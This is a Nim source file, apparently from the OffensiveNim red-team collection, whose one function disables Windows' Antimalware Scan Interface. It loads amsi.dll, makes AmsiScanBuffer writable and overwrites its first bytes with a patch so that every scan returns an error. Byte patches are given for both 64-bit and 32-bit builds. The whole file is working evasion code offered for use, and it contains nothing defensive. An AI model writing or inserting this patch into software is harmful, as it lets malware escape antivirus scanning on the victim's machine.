#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause
]#

import winim/lean
import dynlib


proc patchAMSI*(): bool = 
    # Source: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    when defined amd64:
        const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

    amsi = loadLib("amsi")
    if isNil(amsi):
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer")
    if isNil(cs):
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled